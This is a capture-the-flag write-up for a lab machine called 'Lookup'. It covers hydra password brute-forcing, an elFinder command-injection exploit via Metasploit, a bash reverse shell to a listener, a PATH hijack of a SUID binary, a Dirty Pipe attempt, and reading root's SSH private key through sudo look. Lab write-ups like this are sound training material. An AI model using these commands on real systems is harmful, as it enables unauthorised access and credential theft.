# Lookup
## User Flag:
When I put in admin to the username field, the error message changes and just says "Wrong Password" rather than "Wrong Username & Password" and one of the content headers disappears

`hydra -l admin -P /home/kali/Desktop/SecLists/Passwords/Leaked-Databases/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong"`

Couldnt find anything with this, so I ran another to check for some more usernames, thinking admin may be part of the root flag

`hydra -L /home/kali/Desktop/SecLists/Usernames/xato-net-10-million-usernames.txt  -p test lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong username"`

Results:
```
[80][http-post-form] host: lookup.thm   login: admin   password: test
[80][http-post-form] host: lookup.thm   login: jose   password: test
```

As we can see, Jose was also found, so I ran the password check:

```hydra -l jose -P /home/kali/Desktop/SecLists/Passwords/Leaked-Databases/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong"```

And we find:
```
[80][http-post-form] host: lookup.thm   login: jose   password: password123
```

After putting in jose and password123, we find **http://files.lookup.thm/**

After some research and checking the version, we can determine that the version of elfinder running, **2.1.47** is susceptible to a PHP connector command injection, and there's one available in Metasploit (**exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection**), after setting up my options as so:

LHOST: [Local-Host]
RHOST: 10.66.144.55
VHOST: files.lookup.thm

I wanted a reverse shell so I ran this on my client to listen for a connection:
```nc -lvnp 9001```

and I ran this in the meterpreter instance: 
```execute -f /bin/bash -a "-c 'bash -i >& /dev/tcp/192.168.216.167/9001 0>&1'"```

That worked and created a connection, then I needed a more stable shell so I ran:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
then ctrl + z
stty raw -echo; fg
xterm
script /dev/null -c bash
```
And after that I was good to look around a bit on the www-data account
Tried signing in with **think : nopassword**, did not work, that password was provided in the file sharing webserver, but appeared to be a red herring

So now began the big search for how to get into think, first, check the home directory at ls -la /home/think,
we find a **.passwords** file, which is interesting, that's not normally there.

Now lets try to find some SUID binaries that we may be able to run.

`find / -perm /4000 2>/dev/null`

We will find a **/usr/sbin/pwm**, which is interesting since that one is not normally there and it's owned by root. 
When we try to run it, it uses the id command to extract the username and user ID and attempts to read out the .passwords file, but it finds us instead of think. 
So pretty much, we just need to make sure that id reads out think and gives us that info

If the “id” command is not specified with it’s full path (/bin/id), it is found and executed via the PATH variable in our environment. So we just need to run 
```
export PATH=/tmp:$PATH
echo $PATH
```
to connect us to tmp as our main path, and then we'll just create a id file with the contents:
```
#! /bin/bash
echo "uid=33(think) gid=33(think) groups=33(think)"
```

And once we do, it will think that we are 'think' and return the .passwords file under their account.
Once we run it, we get this output:
```
think
josemario.AKA(think)
```
Giving us the user flag

## Root Flag:
Before I even got into think, I tried some stuff below:

I ran linpeas and got some PE vectors. I tried dirtypipe and it seemed to be working, im just missing the normal user account since www-data is restricted. So I may have accidently done the root flag before the user in a way. 
I downloaded dirtypipe from https://www.exploit-db.com/exploits/50808, put it on the shell, compiled it with "gcc program.c -o program" and now I'm here. I try to run it against a good SUID like /usr/bin/su, but it could not find /tmp/sh since we're restricted.

I kept that in, but that was not the solution, lets first check some basic stuff.

use `sudo -l` to list what files we can run as root.  We can see that we can run **/usr/bin/look**
Matching Defaults entries for think on ip-10-64-142-156:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on ip-10-64-142-156:
    (ALL) /usr/bin/look

Lets see if it's something we can exploit through **https://gtfobins.github.io/**

It says it can **read files as root**, so we can just read `/root/root.txt`, or we can save the private key at sudo `/usr/bin/look '' /root/.ssh/id_rsa`, and then run `ssh -i id_rsa root@lookup.thm` to gain access.

Either way, you will obtain the root flag.

